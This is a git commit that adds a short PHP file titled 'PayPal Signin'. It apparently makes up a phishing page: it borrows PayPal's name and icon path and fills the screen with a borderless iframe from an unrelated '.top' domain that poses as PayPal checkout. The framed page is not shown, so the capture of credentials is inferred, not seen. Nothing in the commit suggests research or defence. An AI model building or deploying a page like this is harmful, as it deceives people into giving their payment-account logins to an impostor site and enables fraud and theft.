1ca95f556feaa62897c0240c43b4cacbb6968915
Loadedxclusive <106339737+ahanaujam@users.noreply.github.com>
2023-06-11 08:10:20 +0100

    Add files via upload

---
+++ PayPal/signin.php
@@ -0,0 +1,4 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
+<title>PayPal Signin</title>
+<link rel="icon" type="image/x-icon" href="/paypal/download.ico">
+<iframe src="https://thegoticket.top/paypal-checkout/" style="width:100%;height:100%;border:0;"title="Paypal"></iframe>
